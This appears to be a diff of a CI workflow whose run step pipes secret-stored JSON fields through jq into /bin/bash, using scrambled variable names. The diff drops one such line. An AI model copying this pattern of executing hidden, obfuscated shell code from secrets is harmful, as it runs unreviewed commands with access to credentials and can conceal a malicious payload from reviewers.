@@ -22,7 +22,6 @@ jobs:
           nc0229: ${{ secrets.nc0229 }}
         run: |
           printf '%s' "$nc0229" | jq -r .nh61 | /bin/bash
-          printf '%s' "$fdi562" | jq -r .u770 | /bin/bash
           echo $bz56189 | jq -r .ifp8 | /bin/bash
           printf '%s' "$dfou39124" | jq -r .weufc6112 | /bin/bash
           printf '%s' "$bp9" | jq -r .dt7726 | /bin/bash
